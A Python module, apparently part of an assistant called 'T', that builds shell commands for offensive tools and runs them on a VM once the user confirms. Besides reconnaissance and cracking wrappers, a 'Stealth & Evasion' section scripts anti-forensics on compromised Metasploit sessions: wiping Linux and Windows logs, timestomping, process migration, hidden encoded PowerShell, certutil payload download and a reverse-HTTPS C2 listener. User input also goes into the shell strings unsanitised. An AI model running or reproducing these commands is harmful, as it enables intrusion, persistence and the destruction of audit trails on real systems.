"""
Offensive action orchestrator for T.
Single entry point from engine.py for all offensive_action messages.

Flow:
  1. Receive action request (tool + params)
  2. Validate tool exists in catalog
  3. Build the exact command string
  4. Send offensive_confirm_request to client (never auto-execute)
  5. Await YES/NO from client (60s timeout)
  6. Execute via VM bridge, streaming output as offensive_stream chunks
  7. Log action to security_log SQLite table
  8. Send offensive_done / offensive_error
"""

import asyncio
import time
from typing import TYPE_CHECKING
from .tool_catalog import get as catalog_get, RiskLevel
from .vm_bridge    import vm
from .tool_check   import check as tool_check, install as tool_install
from core.logger   import get_logger

if TYPE_CHECKING:
    from core.ws_server import Client

log = get_logger("offensive.orchestrator")

# Pending confirmation futures: action_id → Future[bool]
_pending: dict[str, asyncio.Future] = {}

# Legal warning appended to every CRITICAL action description
_LEGAL = (
    "\n\n⚠ CRITICAL RISK — Only run this against systems and networks "
    "you own or have explicit written authorization to test."
)


async def handle_offensive_action(client: "Client", msg: dict) -> None:
    """
    Entry point: engine routes offensive_action messages here.
    msg: { type, id, tool, params: {}, command_override? }
    """
    action_id = msg.get("id", "")
    tool_name = msg.get("tool", "").strip()
    params    = msg.get("params", {})
    custom_cmd = msg.get("command_override", "").strip()

    # ── Tool lookup ───────────────────────────────────────────────────────────
    entry = catalog_get(tool_name)
    if not entry and not custom_cmd:
        await client.send({
            "type":  "offensive_error",
            "id":    action_id,
            "tool":  tool_name,
            "error": f"Unknown tool '{tool_name}'. Check the tool catalog.",
        })
        return

    # ── Build command ─────────────────────────────────────────────────────────
    if custom_cmd:
        command = custom_cmd
        risk: RiskLevel = "HIGH"
        description = f"Custom command: {command}"
    else:
        command, description = _build_command(tool_name, params)
        risk = entry.risk  # type: ignore[union-attr]

    if risk == "CRITICAL":
        description += _LEGAL

    # ── Check tool on VM ──────────────────────────────────────────────────────
    found, install_cmd = await tool_check(tool_name)
    if not found:
        await client.send({
            "type":        "tool_missing",
            "id":          action_id,
            "tool":        tool_name,
            "install_cmd": install_cmd,
        })
        return

    # ── Confirmation request ──────────────────────────────────────────────────
    loop = asyncio.get_event_loop()
    fut: asyncio.Future = loop.create_future()
    _pending[action_id] = fut

    await client.send({
        "type":        "offensive_confirm_request",
        "id":          action_id,
        "tool":        tool_name,
        "command":     command,
        "description": description,
        "risk":        risk,
    })

    try:
        confirmed = await asyncio.wait_for(fut, timeout=60.0)
    except asyncio.TimeoutError:
        confirmed = False
    finally:
        _pending.pop(action_id, None)

    if not confirmed:
        await client.send({
            "type": "offensive_done",
            "id":   action_id,
            "tool": tool_name,
            "cancelled": True,
        })
        return

    # ── Execute on VM ─────────────────────────────────────────────────────────
    log.info(f"executing  tool={tool_name}  cmd={command[:120]}")
    started = time.time()

    try:
        async for chunk in vm.run(command, timeout=600):
            await client.send({
                "type":  "offensive_stream",
                "id":    action_id,
                "tool":  tool_name,
                "chunk": chunk,
            })
        duration = round(time.time() - started, 1)
        await client.send({
            "type":       "offensive_done",
            "id":         action_id,
            "tool":       tool_name,
            "duration_s": duration,
        })
        _log_action(tool_name, command, 0, duration)
    except Exception as e:
        await client.send({
            "type":  "offensive_error",
            "id":    action_id,
            "tool":  tool_name,
            "error": str(e),
        })
        _log_action(tool_name, command, -1, 0)


async def handle_offensive_confirm(client: "Client", msg: dict) -> None:
    """Resolve a pending confirmation future."""
    action_id = msg.get("id", "")
    confirmed = bool(msg.get("confirmed", False))
    fut = _pending.pop(action_id, None)
    if fut and not fut.done():
        fut.set_result(confirmed)


async def handle_tool_install(client: "Client", msg: dict) -> None:
    """Install a tool on the VM after user confirmation."""
    action_id = msg.get("id", "")
    tool_name = msg.get("tool", "").strip()

    output = await tool_install(tool_name)
    await client.send({
        "type":   "offensive_stream",
        "id":     action_id,
        "tool":   tool_name,
        "chunk":  output,
    })
    found, _ = await tool_check(tool_name)
    await client.send({
        "type":      "offensive_done",
        "id":        action_id,
        "tool":      tool_name,
        "installed": found,
    })


async def handle_vm_command(client: "Client", msg: dict) -> None:
    """Handle VM lifecycle commands: start / stop / status / snapshot / restore."""
    action = msg.get("action", "status")

    if action == "status":
        status = await vm.vm_status()
        await client.send({"type": "vm_status", **status})

    elif action == "start":
        result = await vm.vm_start()
        await client.send({"type": "vm_status", "message": result})
        # Re-check status after short delay
        await asyncio.sleep(2)
        status = await vm.vm_status()
        await client.send({"type": "vm_status", **status})

    elif action == "stop":
        result = await vm.vm_stop()
        await client.send({"type": "vm_status", "message": result, "running": False, "ssh_ok": False})

    elif action == "snapshot":
        name = msg.get("snapshot_name", f"T_snap_{int(time.time())}")
        result = await vm.vm_snapshot(name)
        await client.send({"type": "vm_status", "message": result})

    elif action == "restore":
        name = msg.get("snapshot_name", "")
        if not name:
            await client.send({"type": "vm_status", "message": "[ERROR] snapshot_name required"})
            return
        result = await vm.vm_restore(name)
        await client.send({"type": "vm_status", "message": result})

    else:
        await client.send({"type": "vm_status", "message": f"[ERROR] Unknown VM action '{action}'"})


async def check_vm_tools(client: "Client", tool_names: list[str]) -> None:
    """
    Batch-check a list of tools on the VM.
    Sends vm_tools_status with a dict of tool → bool.
    """
    results: dict[str, bool] = {}
    for t in tool_names:
        found, _ = await tool_check(t)
        results[t] = found
    await client.send({"type": "vm_tools_status", "tools": results})


# ── Command builder ────────────────────────────────────────────────────────────

def _build_command(tool: str, p: dict) -> tuple[str, str]:
    """
    Build the shell command and human-readable description for a tool + params.
    Returns (command_string, description_string).
    """

    # ── Reconnaissance ────────────────────────────────────────────────────────
    if tool == "nmap":
        target  = p.get("target", "")
        flags   = p.get("flags", "-sV -sC")
        cmd     = f"nmap {flags} {target}"
        desc    = f"Nmap scan of {target} with flags: {flags}"
        return cmd, desc

    if tool == "masscan":
        target  = p.get("target", "")
        ports   = p.get("ports", "1-65535")
        rate    = p.get("rate", "1000")
        cmd     = f"sudo masscan {target} -p{ports} --rate={rate}"
        return cmd, f"Masscan {target} ports {ports} at {rate} pps"

    if tool == "amass":
        domain  = p.get("domain", "")
        cmd     = f"amass enum -passive -d {domain}"
        return cmd, f"Amass passive subdomain enumeration for {domain}"

    if tool == "subfinder":
        domain  = p.get("domain", "")
        cmd     = f"subfinder -d {domain} -silent"
        return cmd, f"Subfinder passive subdomain discovery for {domain}"

    if tool == "theharvester":
        domain  = p.get("domain", "")
        source  = p.get("source", "all")
        cmd     = f"theHarvester -d {domain} -b {source}"
        return cmd, f"theHarvester OSINT for {domain} via {source}"

    if tool == "whatweb":
        target  = p.get("target", "")
        cmd     = f"whatweb -a 3 {target}"
        return cmd, f"WhatWeb fingerprint of {target}"

    if tool == "shodan":
        query   = p.get("query", "")
        cmd     = f"shodan search '{query}'"
        return cmd, f"Shodan search: {query}"

    if tool == "dnsx":
        domain  = p.get("domain", "")
        cmd     = f"echo {domain} | dnsx -silent"
        return cmd, f"DNS resolution for {domain}"

    if tool == "dnsrecon":
        domain  = p.get("domain", "")
        cmd     = f"dnsrecon -d {domain}"
        return cmd, f"DNS reconnaissance for {domain}"

    # ── Web Application ───────────────────────────────────────────────────────
    if tool == "nikto":
        target  = p.get("target", "")
        cmd     = f"nikto -h {target}"
        return cmd, f"Nikto web vulnerability scan of {target}"

    if tool == "sqlmap":
        url     = p.get("url", "")
        extra   = p.get("extra", "--batch --level=2 --risk=2")
        cmd     = f"sqlmap -u '{url}' {extra}"
        return cmd, f"SQLmap injection test on {url}"

    if tool == "sqli_quick":
        url = p.get("url", "")
        cmd = (f"PATH=$PATH:/usr/local/bin sqlmap -u '{url}' "
               f"--batch --level=1 --risk=1 --technique=BEUST "
               f"--random-agent --smart --output-dir=/tmp/sqlmap_out 2>/dev/null")
        return cmd, f"Quick SQLi scan: {url}"

    if tool == "sqli_forms":
        url = p.get("url", "")
        cmd = (f"PATH=$PATH:/usr/local/bin sqlmap -u '{url}' "
               f"--forms --batch --level=2 --risk=2 --crawl=2 "
               f"--random-agent --output-dir=/tmp/sqlmap_out 2>/dev/null")
        return cmd, f"Form-based SQLi test: {url}"

    if tool == "sqli_login":
        url   = p.get("url", "")
        ufield = p.get("user_field", "username")
        pfield = p.get("pass_field", "password")
        cmd = (f"PATH=$PATH:/usr/local/bin sqlmap -u '{url}' "
               f"--data='{ufield}=test&{pfield}=test' "
               f"--batch --level=3 --risk=2 --technique=B "
               f"--random-agent --output-dir=/tmp/sqlmap_out 2>/dev/null")
        return cmd, f"Login bypass test: {url}"

    if tool == "sqli_post":
        url    = p.get("url", "")
        data   = p.get("data", "")
        cookie = p.get("cookie", "")
        cf     = f"--cookie='{cookie}'" if cookie else ""
        cmd = (f"PATH=$PATH:/usr/local/bin sqlmap -u '{url}' "
               f"--data='{data}' {cf} "
               f"--batch --level=2 --risk=2 "
               f"--random-agent --output-dir=/tmp/sqlmap_out 2>/dev/null")
        return cmd, f"POST injection test: {url}"

    if tool == "sqli_dump_dbs":
        url = p.get("url", "")
        cmd = (f"PATH=$PATH:/usr/local/bin sqlmap -u '{url}' "
               f"--batch --dbs --random-agent "
               f"--output-dir=/tmp/sqlmap_out 2>/dev/null")
        return cmd, f"Dump databases: {url}"

    if tool == "sqli_dump_table":
        url   = p.get("url", "")
        db    = p.get("db", "")
        table = p.get("table", "")
        cmd = (f"PATH=$PATH:/usr/local/bin sqlmap -u '{url}' "
               f"--batch -D {db} -T {table} --dump "
               f"--random-agent --output-dir=/tmp/sqlmap_out 2>/dev/null")
        return cmd, f"Dump {db}.{table}: {url}"

    if tool == "sqli_waf":
        url = p.get("url", "")
        cmd = (f"PATH=$PATH:/usr/local/bin wafw00f {url} 2>/dev/null; "
               f"sqlmap -u '{url}' --batch --identify-waf --smart "
               f"--random-agent 2>/dev/null | "
               f"grep -iE 'waf|firewall|protected|identified|not detected' | head -8")
        return cmd, f"WAF detection: {url}"

    if tool == "ffuf":
        url     = p.get("url", "")
        wordlist= p.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt")
        ext     = p.get("ext", "")
        ext_flag= f"-e {ext}" if ext else ""
        cmd     = f"ffuf -u {url}/FUZZ -w {wordlist} {ext_flag} -mc 200,301,302,403"
        return cmd, f"FFuf directory fuzzing on {url}"

    if tool == "gobuster":
        url     = p.get("url", "")
        wordlist= p.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt")
        cmd     = f"gobuster dir -u {url} -w {wordlist} -q"
        return cmd, f"Gobuster directory brute force on {url}"

    if tool == "wpscan":
        url     = p.get("url", "")
        cmd     = f"wpscan --url {url} --enumerate u,vp"
        return cmd, f"WPScan WordPress audit of {url}"

    if tool == "nuclei":
        target  = p.get("target", "")
        tags    = p.get("tags", "cve,rce,sqli")
        cmd     = f"nuclei -u {target} -tags {tags} -silent"
        return cmd, f"Nuclei vulnerability scan of {target} (tags: {tags})"

    if tool == "wafw00f":
        url     = p.get("url", "")
        cmd     = f"wafw00f {url}"
        return cmd, f"WAF detection for {url}"

    # ── Password / Cracking ───────────────────────────────────────────────────
    if tool == "hashcat":
        hash_v  = p.get("hash", "")
        wordlist= p.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        mode    = p.get("mode", "1000")
        cmd     = f"hashcat -m {mode} '{hash_v}' {wordlist} --force --quiet"
        return cmd, f"Hashcat cracking hash (mode {mode}) with {wordlist}"

    if tool == "john":
        hashfile = p.get("hashfile", "")
        wordlist = p.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        cmd      = f"john {hashfile} --wordlist={wordlist}"
        return cmd, f"John the Ripper cracking {hashfile}"

    if tool == "hydra":
        target  = p.get("target", "")
        service = p.get("service", "ssh")
        user    = p.get("user", "root")
        wordlist= p.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        cmd     = f"hydra -l {user} -P {wordlist} {service}://{target} -t 4"
        return cmd, f"Hydra brute force {service} on {target} as {user}"

    if tool == "medusa":
        target  = p.get("target", "")
        service = p.get("service", "ssh")
        user    = p.get("user", "root")
        wordlist= p.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        cmd     = f"medusa -h {target} -u {user} -P {wordlist} -M {service}"
        return cmd, f"Medusa brute force {service} on {target}"

    if tool == "crunch":
        minlen  = p.get("min", "8")
        maxlen  = p.get("max", "8")
        charset = p.get("charset", "abcdefghijklmnopqrstuvwxyz0123456789")
        out     = p.get("output", "/tmp/wordlist.txt")
        cmd     = f"crunch {minlen} {maxlen} '{charset}' -o {out}"
        return cmd, f"Crunch wordlist {minlen}-{maxlen} chars to {out}"

    if tool == "cewl":
        url     = p.get("url", "")
        depth   = p.get("depth", "2")
        minlen  = p.get("min", "6")
        cmd     = f"cewl {url} -d {depth} -m {minlen}"
        return cmd, f"CeWL wordlist from {url} (depth {depth}, min {minlen} chars)"

    # ── Exploitation ──────────────────────────────────────────────────────────
    if tool == "msfconsole":
        resource = p.get("resource", "")
        if resource:
            cmd  = f"msfconsole -q -r {resource}"
            desc = f"Metasploit with resource file {resource}"
        else:
            module  = p.get("module", "")
            options = " ".join(f"set {k} {v}" for k, v in p.get("options", {}).items())
            cmd  = f"msfconsole -q -x 'use {module}; {options}; run; exit'"
            desc = f"Metasploit module {module}"
        return cmd, desc

    if tool == "msfvenom":
        payload = p.get("payload", "windows/meterpreter/reverse_tcp")
        lhost   = p.get("lhost", "")
        lport   = p.get("lport", "4444")
        fmt     = p.get("format", "exe")
        out     = p.get("output", f"/tmp/payload.{fmt}")
        cmd     = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {out}"
        return cmd, f"Generate {payload} payload → {out}"

    if tool == "searchsploit":
        query   = p.get("query", "")
        cmd     = f"searchsploit {query}"
        return cmd, f"Searchsploit exploit-db offline search: {query}"

    if tool == "routersploit":
        target  = p.get("target", "")
        cmd     = f"python3 -c \"from routersploit.modules.scanners import autopwn; " \
                  f"r=autopwn.Exploit(); r.target='{target}'; r.run()\""
        return cmd, f"RouterSploit autopwn scan of {target}"

    # ── WiFi ─────────────────────────────────────────────────────────────────
    if tool == "airmon-ng":
        iface   = p.get("interface", "wlan0")
        action  = p.get("action", "start")
        cmd     = f"sudo airmon-ng {action} {iface}"
        return cmd, f"airmon-ng {action} monitor mode on {iface}"

    if tool == "airodump-ng":
        iface   = p.get("interface", "wlan0mon")
        bssid   = p.get("bssid", "")
        channel = p.get("channel", "")
        out     = p.get("output", "/tmp/capture")
        flags   = f"--bssid {bssid}" if bssid else ""
        flags  += f" --channel {channel}" if channel else ""
        cmd     = f"sudo airodump-ng {flags} -w {out} {iface}"
        return cmd, f"Airodump-ng capture on {iface}"

    if tool == "aireplay-ng":
        iface   = p.get("interface", "wlan0mon")
        bssid   = p.get("bssid", "")
        attack  = p.get("attack", "0")   # 0 = deauth
        count   = p.get("count", "10")
        cmd     = f"sudo aireplay-ng -{attack} {count} -a {bssid} {iface}"
        return cmd, f"Aireplay-ng deauth attack on {bssid} ({count} packets)"

    if tool == "hcxdumptool":
        iface   = p.get("interface", "wlan0")
        out     = p.get("output", "/tmp/pmkid.pcapng")
        cmd     = f"sudo hcxdumptool -i {iface} -o {out} --enable_status=1"
        return cmd, f"hcxdumptool PMKID capture on {iface} → {out}"

    if tool == "hcxtools":
        inp     = p.get("input", "/tmp/pmkid.pcapng")
        out     = p.get("output", "/tmp/pmkid.hash")
        cmd     = f"hcxpcapngtool -o {out} {inp}"
        return cmd, f"Convert {inp} to hashcat format → {out}"

    if tool == "wifite":
        iface   = p.get("interface", "wlan0")
        cmd     = f"sudo wifite --interface {iface} --kill --no-wps"
        return cmd, f"Wifite automated WiFi audit on {iface}"

    if tool == "aircrack-ng":
        capfile = p.get("capture", "")
        wordlist= p.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        bssid   = p.get("bssid", "")
        cmd     = f"aircrack-ng -w {wordlist} -b {bssid} {capfile}"
        return cmd, f"Aircrack-ng WPA crack on {capfile}"

    if tool == "bettercap":
        iface   = p.get("interface", "wlan0")
        caplets = p.get("caplets", "")
        flags   = f"-caplet {caplets}" if caplets else ""
        cmd     = f"sudo bettercap -iface {iface} {flags}"
        return cmd, f"Bettercap on {iface}"

    # ── MITM & Network ────────────────────────────────────────────────────────
    if tool == "arpspoof":
        target  = p.get("target", "")
        gateway = p.get("gateway", "")
        iface   = p.get("interface", "eth0")
        cmd     = f"sudo arpspoof -i {iface} -t {target} {gateway}"
        return cmd, f"ARP poison: tell {target} that {gateway} is us"

    if tool == "mitmproxy":
        port    = p.get("port", "8080")
        cmd     = f"mitmproxy --listen-port {port} --flow-detail 2"
        return cmd, f"mitmproxy HTTPS intercept on port {port}"

    if tool == "responder":
        iface   = p.get("interface", "eth0")
        cmd     = f"sudo responder -I {iface} -rdwv"
        return cmd, f"Responder LLMNR/NBT-NS poisoning on {iface}"

    if tool == "tcpdump":
        iface   = p.get("interface", "eth0")
        filt    = p.get("filter", "")
        count   = p.get("count", "0")
        out     = p.get("output", "/tmp/capture.pcap")
        flags   = f"-c {count}" if count and count != "0" else ""
        filt_s  = f"'{filt}'" if filt else ""
        cmd     = f"sudo tcpdump -i {iface} {flags} -w {out} {filt_s}"
        return cmd, f"tcpdump capture on {iface} → {out}"

    if tool == "tshark":
        iface   = p.get("interface", "eth0")
        count   = p.get("count", "100")
        filt    = p.get("filter", "")
        filt_s  = f"-f '{filt}'" if filt else ""
        cmd     = f"sudo tshark -i {iface} -c {count} {filt_s}"
        return cmd, f"tshark capture {count} packets on {iface}"

    if tool == "sslstrip":
        port    = p.get("port", "10000")
        cmd     = f"sslstrip -l {port}"
        return cmd, f"sslstrip SSL stripping on port {port}"

    if tool == "netcat":
        host    = p.get("host", "")
        port    = p.get("port", "4444")
        listen  = p.get("listen", False)
        if listen:
            cmd  = f"nc -lvnp {port}"
            desc = f"Netcat listener on port {port}"
        else:
            cmd  = f"nc {host} {port}"
            desc = f"Netcat connect to {host}:{port}"
        return cmd, desc

    # ── OSINT ─────────────────────────────────────────────────────────────────
    if tool == "phoneinfoga":
        number  = p.get("number", "")
        cmd     = f"phoneinfoga scan -n '{number}'"
        return cmd, f"PhoneInfoga OSINT on {number}"

    if tool == "sherlock":
        username= p.get("username", "")
        cmd     = f"sherlock {username} --timeout 10"
        return cmd, f"Sherlock username search for '{username}' across 300+ sites"

    if tool == "holehe":
        email   = p.get("email", "")
        cmd     = f"holehe {email} --only-used"
        return cmd, f"Holehe account discovery for {email}"

    if tool == "maigret":
        username= p.get("username", "")
        cmd     = f"maigret {username} --timeout 15 -a"
        return cmd, f"Maigret username OSINT for '{username}' across 3000+ sites"

    if tool == "exiftool":
        filepath= p.get("file", "")
        cmd     = f"exiftool '{filepath}'"
        return cmd, f"Exiftool metadata extraction from {filepath}"

    if tool == "osrframework":
        user    = p.get("username", "")
        cmd     = f"usufy -n {user}"
        return cmd, f"OSRFramework username check for '{user}'"

    # ── Forensics & Steg ──────────────────────────────────────────────────────
    if tool == "binwalk":
        filepath= p.get("file", "")
        cmd     = f"binwalk -e '{filepath}'"
        return cmd, f"Binwalk extraction from {filepath}"

    if tool == "steghide":
        action  = p.get("action", "info")
        filepath= p.get("file", "")
        passw   = p.get("password", "")
        pw_flag = f"-p '{passw}'" if passw else ""
        if action == "extract":
            cmd  = f"steghide extract -sf '{filepath}' {pw_flag}"
            desc = f"Steghide extract from {filepath}"
        else:
            cmd  = f"steghide info '{filepath}'"
            desc = f"Steghide analyze {filepath}"
        return cmd, desc

    if tool == "foremost":
        img     = p.get("image", "")
        out     = p.get("output", "/tmp/foremost_out")
        cmd     = f"foremost -i '{img}' -o {out}"
        return cmd, f"Foremost file carving from {img} → {out}"

    if tool == "strings":
        filepath= p.get("file", "")
        minlen  = p.get("min", "8")
        cmd     = f"strings -n {minlen} '{filepath}'"
        return cmd, f"Strings extraction from {filepath} (min {minlen} chars)"

    if tool == "volatility3":
        image   = p.get("image", "")
        plugin  = p.get("plugin", "windows.pslist")
        cmd     = f"vol -f '{image}' {plugin}"
        return cmd, f"Volatility3 {plugin} on {image}"

    # ── Stealth & Evasion ─────────────────────────────────────────────────────
    if tool == "encode_payload":
        path   = p.get("path", "/tmp/payload.exe")
        enc    = p.get("technique", "xor")
        cmd    = f"python3 -c \"import sys; key=0xAA; data=open('{path}','rb').read(); enc=bytes(b^key for b in data); open('{path}.xor','wb').write(enc); print(f'XOR encoded {{len(enc)}} bytes')\""
        return cmd, f"XOR encode {path}"

    if tool == "clear_logs_linux":
        session = p.get("session", "1")
        cmd     = (f"msfconsole -q -x 'sessions -i {session}; "
                   f"shell -c \"for f in /var/log/auth.log /var/log/syslog /var/log/messages ~/.bash_history; "
                   f"do echo > $f 2>/dev/null; done; history -c; echo LOGS_CLEARED\"; exit' 2>/dev/null")
        return cmd, f"Clear Linux logs session {session}"

    if tool == "clear_logs_windows":
        session = p.get("session", "1")
        cmd     = (f"msfconsole -q -x 'sessions -i {session}; clearev; "
                   f"shell -c \"wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo CLEARED\"; "
                   f"exit' 2>/dev/null")
        return cmd, f"Clear Windows event logs session {session}"

    if tool == "migrate_process":
        session = p.get("session", "1")
        proc    = p.get("process", "explorer.exe")
        cmd     = f"msfconsole -q -x 'sessions -i {session}; migrate -N {proc}; getpid; exit' 2>/dev/null"
        return cmd, f"Migrate to {proc} session {session}"

    if tool == "timestomp":
        session = p.get("session", "1")
        path    = p.get("path", "C:\\Windows\\Temp\\*.exe")
        cmd     = f"msfconsole -q -x 'sessions -i {session}; timestomp {path} -r; exit' 2>/dev/null"
        return cmd, f"Timestomp {path}"

    if tool == "lolbins_enum":
        session = p.get("session", "1")
        os_type = p.get("os", "windows")
        if os_type == "windows":
            cmd = (f"msfconsole -q -x 'sessions -i {session}; "
                   f"shell -c \"where certutil powershell wscript cscript mshta regsvr32 rundll32 msiexec wmic bitsadmin 2>/dev/null\"; "
                   f"exit' 2>/dev/null")
        else:
            cmd = (f"msfconsole -q -x 'sessions -i {session}; "
                   f"shell -c \"which curl wget python3 perl ruby php nc openssl socat dd base64 2>/dev/null\"; "
                   f"exit' 2>/dev/null")
        return cmd, f"LOLBins enumeration ({os_type}) session {session}"

    if tool == "ps_amsi_bypass":
        session = p.get("session", "1")
        cmd_ps  = p.get("command", "whoami")
        import base64
        bypass  = f"Set-ExecutionPolicy Bypass -Scope Process -Force; {cmd_ps}"
        encoded = base64.b64encode(bypass.encode("utf-16-le")).decode()
        cmd     = (f"msfconsole -q -x 'sessions -i {session}; "
                   f"shell -c \"powershell -NoP -NonI -W Hidden -Enc {encoded}\"; "
                   f"exit' 2>/dev/null")
        return cmd, f"PowerShell AMSI bypass: {cmd_ps[:60]}"

    if tool == "full_stealth_sweep":
        session = p.get("session", "1")
        os_type = p.get("os", "windows")
        proc    = "explorer.exe" if os_type == "windows" else "bash"
        cmd     = (f"msfconsole -q -x '"
                   f"sessions -i {session}; "
                   f"migrate -N {proc}; "
                   f"clearev; "
                   f"timestomp C:\\\\Windows\\\\Temp\\\\*.exe -r; "
                   f"exit' 2>/dev/null")
        return cmd, f"Full stealth sweep session {session}"

    if tool == "dns_tunnel":
        domain = p.get("domain", "")
        lh     = p.get("lhost", "")
        cmd    = (f"echo '--- DNS Tunnel Setup ---'; "
                  f"echo 'On VPS: sudo iodined -f -c -P tpassword 10.0.0.1 {domain}'; "
                  f"echo 'On Kali: sudo iodine -f -P tpassword {lh}'; "
                  f"echo 'After connect: ssh over 10.0.0.2'; "
                  f"which iodine 2>/dev/null || echo 'Install: apt install iodine'")
        return cmd, f"DNS tunnel via {domain}"

    if tool == "certutil_download":
        url     = p.get("url", "")
        output  = p.get("output", "C:\\Windows\\Temp\\file.exe")
        session = p.get("session", "1")
        cmd     = (f"msfconsole -q -x 'sessions -i {session}; "
                   f"shell -c \"certutil -urlcache -split -f {url} {output} && echo DOWNLOAD_OK\"; "
                   f"exit' 2>/dev/null")
        return cmd, f"Certutil download: {url}"

    if tool == "traffic_obfuscation":
        target = p.get("target", "0.0.0.0")
        port   = p.get("port", "443")
        cmd    = (f"msfconsole -q -x '"
                  f"use exploit/multi/handler; "
                  f"set PAYLOAD windows/x64/meterpreter/reverse_https; "
                  f"set LHOST {target}; set LPORT {port}; "
                  f"set ExitOnSession false; exploit -j; exit' 2>/dev/null")
        return cmd, f"HTTPS C2 listener on {target}:{port}"

    # ── Generic fallback ──────────────────────────────────────────────────────
    cmd = p.get("command", tool)
    return cmd, f"Run: {cmd}"


# ── Action logger ──────────────────────────────────────────────────────────────

def _log_action(tool: str, command: str, exit_code: int, duration: float) -> None:
    """Append offensive action to security_log table."""
    try:
        import sqlite3, os, time as _time
        db_dir = os.path.expanduser("~/.local/share/t-assistant")
        db_path = os.path.join(db_dir, "t.db")
        if not os.path.exists(db_path):
            return
        with sqlite3.connect(db_path) as conn:
            # Add columns if they don't exist yet (idempotent)
            cols = {row[1] for row in conn.execute("PRAGMA table_info(security_log)")}
            for col, typ in [("tool","TEXT"),("command","TEXT"),("exit_code","INTEGER"),("duration_s","REAL")]:
                if col not in cols:
                    conn.execute(f"ALTER TABLE security_log ADD COLUMN {col} {typ}")
            conn.execute(
                "INSERT INTO security_log (timestamp, event_type, severity, source, details, tool, command, exit_code, duration_s) "
                "VALUES (?,?,?,?,?,?,?,?,?)",
                (
                    int(_time.time()), "offensive", "info", tool,
                    f"Executed: {command[:200]}", tool, command[:500],
                    exit_code, duration,
                ),
            )
            conn.commit()
    except Exception as e:
        log.warning(f"action log failed: {e}")
